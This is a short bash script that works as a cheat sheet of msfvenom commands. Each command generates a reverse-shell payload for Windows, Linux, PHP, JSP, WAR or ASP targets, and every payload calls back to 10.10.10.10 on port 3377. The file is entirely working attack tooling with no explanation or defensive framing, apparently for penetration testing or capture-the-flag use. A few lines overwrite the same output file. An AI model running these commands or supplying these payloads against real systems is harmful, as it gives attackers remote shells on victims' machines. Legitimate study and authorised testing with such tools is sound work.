#!/bin/bash

## Windows
#Stageless Payloads
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/v-shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx > ~/reverse-shell/v-shell.aspx

#Staged Payloads
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/sv-shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f aspx > ~/reverse-shell/sv-shell.aspx

##Linux
msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.sh

#Staged Payloads
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x86.elf
msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x64.elf

#Stageless Payloads
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f elf > shell-x64.elf

##Web
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=3377 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war > shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > shell.jsp
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp > s-shell.asp
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f asp > shell.asp

##Java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/v-shell.war
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f war -o ~/reverse-shell/v-shell2.war

#unpack war file for jsp file
